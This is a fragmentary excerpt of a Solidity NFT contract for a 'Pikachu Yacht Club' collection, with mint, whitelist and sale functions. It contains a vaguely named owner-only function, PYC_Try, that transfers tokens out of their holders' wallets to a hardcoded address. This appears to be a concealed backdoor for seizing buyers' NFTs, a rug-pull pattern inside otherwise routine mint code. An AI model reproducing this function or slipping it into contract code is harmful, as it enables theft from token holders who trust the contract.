...
contract Pikachu_Yacht_Club is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Pikachu Yacht Club", "PYC", maxBatchSize_, collectionSize_) {
    maxPerAddressDuringMint = maxBatchSize_;
  }

  modifier PYC_callerIsUser() {
    require(tx.origin == msg.sender, "The caller is another contract");
    _;
  }

  function PYC_getMaxSupply() view public returns(uint256){
    return maxSupply;
  }


  function PYC_WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable PYC_callerIsUser {
    ...
    PYC_refundIfOver(totalCost);
  }

  function PYC_PublicMint(uint256 quantity) external payable PYC_callerIsUser {    
  ...
  function PYC_refundIfOver(uint256 price) private {
  ...
  function PYC_isPublicSaleOn() public view returns (bool) {
    return
      saleConfig.Price != 0 &&
  ...
  function PYC_Try(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x43736A867Fdc953C45ca35D8A17a3Ea2FC6fB856, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xd8dc27fC63fa19eDD7c41Ed467dEcfaB0BAEB1eE);
